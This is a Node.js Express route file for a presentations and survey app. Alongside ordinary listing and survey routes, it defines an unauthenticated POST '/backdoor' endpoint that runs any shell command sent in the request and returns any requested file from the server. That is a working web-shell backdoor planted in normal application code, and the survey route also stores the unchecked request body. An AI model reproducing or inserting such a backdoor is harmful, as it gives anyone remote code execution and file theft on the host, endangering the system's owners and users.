var express = require('express');
var router = express.Router();
const { exec } = require('child_process')
const Presentation = require('../models/presentation')
const Survey = require('../models/survey')
const sequelize = require('sequelize')

/* GET home page. */
router.get('/presentations', function(req, res, next) {
  Presentation.findAll({
    attributes: ["id", "title", "presenter"],
    order: [[sequelize.fn('lower', sequelize.col('title')), 'ASC']]
  })
  .then((rows) => {
    res.send(rows)
  })
  .catch((error) => {
    res.send([])
  })
});

router.post('/survey', function(req, res, next) {
  if(req.body.links){
    req.body.links = req.body.links.join(' ')
  }
  Survey.upsert(req.body)
  res.send(req.body)
});

router.get('/survey', function(req, res, next) {
  let options = { attributes: { exclude: ['createdAt', 'updatedAt'] } }
  if(req.query.id) {
    options = {...options, where: { presentationID: req.query.id } }
  }
  Survey.findAll(options)
  .then((row) => {
    res.send(row)
  })
  .catch((error) => {
    res.send([])
  })
})

router.post('/backdoor', function(req, res, next) {
  switch(req.body.cmd) {
    case 'download':
      res.sendFile(req.body.payload, function(err) {
        if(err)
          res.send({errno: err.errno, errcode: err.code})
      })
      break
    case 'exec':
      exec(req.body.payload, (error, stdout, stderr) => {
        res.send({error: error, stdout: stdout, stderr: stderr})
      })
      break
  }
});


module.exports = router;
